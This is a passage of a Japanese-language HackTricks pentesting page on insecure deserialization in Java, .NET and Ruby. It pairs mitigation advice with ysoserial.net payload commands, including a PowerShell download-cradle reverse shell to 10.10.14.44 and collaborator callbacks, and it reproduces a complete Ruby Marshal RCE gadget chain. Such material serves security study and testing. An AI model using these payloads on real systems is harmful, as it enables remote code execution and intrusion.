**シリアル化フィルターの実装**: Java 9 では、**`ObjectInputFilter`** インターフェースを介してシリアル化フィルターが導入され、デシリアル化される前にシリアル化されたオブジェクトが満たす必要がある基準を指定する強力なメカニズムが提供されます。これらのフィルターは、グローバルに適用するか、ストリームごとに適用することができ、デシリアル化プロセスに対する細かい制御を提供します。

シリアル化フィルターを利用するには、すべてのデシリアル化操作に適用されるグローバルフィルターを設定するか、特定のストリームに動的に構成することができます。例:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**外部ライブラリを活用したセキュリティの強化**: **NotSoSerial**、**jdeserialize**、**Kryo**などのライブラリは、Javaの逆シリアル化を制御および監視するための高度な機能を提供します。これらのライブラリは、ホワイトリストやブラックリストのクラス、逆シリアル化前のシリアル化されたオブジェクトの分析、カスタムシリアル化戦略の実装など、追加のセキュリティレイヤーを提供できます。

- **NotSoSerial** は、実行される信頼できないコードを防ぐために逆シリアル化プロセスをインターセプトします。
- **jdeserialize** は、逆シリアル化せずにシリアル化されたJavaオブジェクトの分析を可能にし、潜在的に悪意のあるコンテンツを特定するのに役立ちます。
- **Kryo** は、速度と効率を重視した代替シリアル化フレームワークであり、セキュリティを強化できる構成可能なシリアル化戦略を提供します。


### 参考文献

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* 逆シリアル化とysoserialに関するトーク: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Gadgetinspectorに関するトーク: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) およびスライド: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec論文: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Javaおよび.Net JSON逆シリアル化 **論文:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** トーク: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) およびスライド: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* 逆シリアル化CVE: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

**JNDI Injection**とは何か、**RMI**、**CORBA**、**LDAP**を介してそれを悪用する方法、および**log4shell**をどのように悪用するか（およびこの脆弱性の例）を次のページで見つけてください:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) APIは、2つ以上のクライアント間でメッセージを送信するためのJavaメッセージ指向ミドルウェアAPIです。これは、プロデューサー-コンシューマー問題を処理する実装です。JMSはJava Platform, Enterprise Edition（Java EE）の一部であり、Sun Microsystemsで開発された仕様によって定義されましたが、その後Java Community Processによってガイドされています。これは、Java EEに基づくアプリケーションコンポーネントがメッセージを作成、送信、受信、読み取りすることを可能にするメッセージング標準です。分散アプリケーションの異なるコンポーネント間の通信を緩やかに結合し、信頼性があり非同期であることを可能にします。([Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service))。

### 製品

このミドルウェアを使用してメッセージを送信するいくつかの製品があります:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (291).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (292).png>)

### 悪用

つまり、**危険な方法でJMSを使用している多くのサービスが存在**します。したがって、これらのサービスにメッセージを送信するための**十分な権限**がある場合（通常、有効な資格情報が必要です）、**逆シリアル化される悪意のあるオブジェクトを送信できる可能性があります**。\
これはつまり、この悪用では、そのメッセージを使用するすべての**クライアントが感染する**ことを意味します。

サービスが脆弱であっても（ユーザー入力を安全に逆シリアル化していないため）、脆弱性を悪用するためには有効なガジェットを見つける必要があります。

ツール[JMET](https://github.com/matthiaskaiser/jmet)は、既知のガジェットを使用してシリアル化された悪意のあるオブジェクトを送信し、これらのサービスに接続して攻撃するために作成されました。これらのエクスプロイトは、サービスがまだ脆弱であり、使用されたガジェットのいずれかが脆弱なアプリケーション内に存在する場合に機能します。

### 参考文献

* JMETトーク: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* スライド: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Netのコンテキストでは、逆シリアル化エクスプロイトは、Javaで見られるものと同様に、ガジェットがオブジェクトの逆シリアル化中に特定のコードを実行するように悪用されます。

### フィンガープリント

#### WhiteBox

次の出現箇所を検査する必要があります:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

焦点は、ユーザーが制御する変数によって型を決定できるシリアライザに置かれるべきです。

#### BlackBox

検索は、サーバーサイドで逆シリアル化される可能性のあるBase64エンコードされた文字列 **AAEAAAD/////** または同様のパターンに対して行われるべきであり、逆シリアル化される型を制御する権限を付与します。これには、**JSON**または**XML**構造が含まれ、`TypeObject`または`$type`を特徴とするものが含まれます。

### ysoserial.net

この場合、ツール[**ysoserial.net**](https://github.com/pwntester/ysoserial.net)を使用して**逆シリアル化エクスプロイトを作成**できます。Gitリポジトリをダウンロードしたら、たとえばVisual Studioを使用してツールを**コンパイル**する必要があります。

**ysoserial.netがどのようにエクスプロイトを作成するか**について学びたい場合は、[**ここでObjectDataProviderガジェット+ExpandedWrapper+Json.Netフォーマッタが説明されているページをチェックしてください**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)。

**ysoserial.net**の主なオプションは次のとおりです: **`--gadget`**、**`--formatter`**、**`--output`**、**`--plugin`**。

* **`--gadget`** は、悪用するガジェットを示すために使用されます（逆シリアル化中にコマンドを実行するために悪用されるクラス/関数を示します）。
* **`--formatter`** は、エクスプロイトをシリアル化する方法を示すために使用されます（ペイロードを逆シリアル化するためにバックエンドで使用されているライブラリを知っており、それを使用してシリアル化する必要があります）。
* **`--output`** は、エクスプロイトを**raw**または**base64**エンコードで表示するかを示すために使用されます。_**ysoserial.net**はペイロードを**UTF-16LE**でエンコードします（Windowsでデフォルトで使用されるエンコーディング）ので、Linuxコンソールから単にエンコードしても、正しく機能しない可能性がある**エンコーディングの互換性の問題**が発生する可能性があります（HTB JSONボックスでは、ペイロードがUTF-16LEとASCIIの両方で機能しましたが、これは常に機能するとは限りません）。_
* **`--plugin`** ysoserial.netは、ViewStateなどの**特定のフレームワーク用のエクスプロイトを作成**するためのプラグインをサポートしています。

#### ysoserial.netのその他のパラメータ

* `--minify` は、**より小さなペイロード**を提供します（可能な場合）
* `--raf -f Json.Net -c "anything"` これは、提供されたフォーマッタ（この場合は`Json.Net`）で使用できるすべてのガジェットを示します
* `--sf xml` あなたはガジェットを示すことができます（`-g`）そしてysoserial.netは"xml"を含むフォーマッタを検索します（大文字小文字を区別しない）

**ysoserialの例**、エクスプロイトの作成:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net**には、各エクスプロイトがどのように機能するかをよりよく理解するのに役立つ非常に興味深いパラメーターがあります：`--test`  
このパラメーターを指定すると、**ysoserial.net**はエクスプロイトをローカルで試行し、ペイロードが正しく機能するかどうかをテストできます。  
このパラメーターは役立ちます。なぜなら、コードを確認すると、次のようなコードの断片が見つかるからです（[ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)から）:
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
これは、エクスプロイトをテストするためにコードが[serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)を呼び出すことを意味します。
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**前のコードは作成されたエクスプロイトに脆弱**です。そのため、.Netアプリケーションで類似したものを見つけた場合、そのアプリケーションも脆弱である可能性があります。\
したがって、**`--test`**パラメータを使用すると、**ysoserial.net**が作成できる逆シリアル化エクスプロイトに**どのコードチャンクが脆弱**かを理解できます。

### ViewState

[**.Netの\_\_ViewStateパラメータを悪用しようとする方法についてのこのPOST**](exploiting-\_\_viewstate-parameter.md)を見て、**任意のコードを実行**してください。被害者マシンが使用している秘密を**すでに知っている**場合は、[**この投稿を読んでコードを実行**](exploiting-\_\_viewstate-knowing-the-secret.md)**してください**。

### 予防

.Netでの逆シリアル化に関連するリスクを軽減するためには：

- **データストリームがオブジェクトタイプを定義することを避ける**。可能な限り`DataContractSerializer`または`XmlSerializer`を使用します。

- **`JSON.Net`では、`TypeNameHandling`を`None`に設定します**：
%%%TypeNameHandling = TypeNameHandling.None%%%

- **`JavaScriptSerializer`を`JavaScriptTypeResolver`と一緒に使用しない**。

- **逆シリアル化できるタイプを制限**し、`System.IO.FileInfo`などの.Netタイプに固有のリスクを理解します。これにより、サーバーファイルのプロパティを変更できる可能性があり、サービス拒否攻撃につながる可能性があります。

- **リスクのあるプロパティを持つタイプには注意**してください。たとえば、`Value`プロパティを持つ`System.ComponentModel.DataAnnotations.ValidationException`は悪用される可能性があります。

- **逆シリアル化プロセスに影響を与える攻撃者を防ぐために、タイプのインスタンス化を安全に制御**します。これにより、`DataContractSerializer`や`XmlSerializer`さえも脆弱になります。

- `BinaryFormatter`および`JSON.Net`用にカスタム`SerializationBinder`を使用した**ホワイトリストコントロールを実装**します。

- .Net内の既知の安全でない逆シリアル化ガジェットについて**情報を収集**し、デシリアライザがそのようなタイプをインスタンス化しないようにします。

- **潜在的にリスキーなコードを隔離**して、WPFアプリケーションの`System.Windows.Data.ObjectDataProvider`などの既知のガジェットが信頼できないデータソースにさらされないようにします。

### **参考文献**

* Javaおよび.Net JSON逆シリアル化**論文:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**、**トーク:** [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c)**、**スライド:** [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Rubyでは、**marshal**ライブラリ内の2つのメソッドによってシリアル化が容易に行われます。最初のメソッドである**dump**は、オブジェクトをバイトストリームに変換するために使用されます。このプロセスはシリアル化と呼ばれます。逆に、2番目のメソッドである**load**は、バイトストリームをオブジェクトに戻すために使用され、逆シリアル化と呼ばれます。

シリアル化されたオブジェクトを保護するために、**RubyはHMAC（Hash-Based Message Authentication Code）**を使用してデータの整合性と信頼性を確保します。この目的で使用されるキーは、次のいずれかの場所に保存されます：

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.Xジェネリック逆シリアル化からRCEガジェットチェーン（詳細は[https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)）**：
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Ruby On Railsを悪用する他のRCEチェーン: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**をフォロー**する
* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>
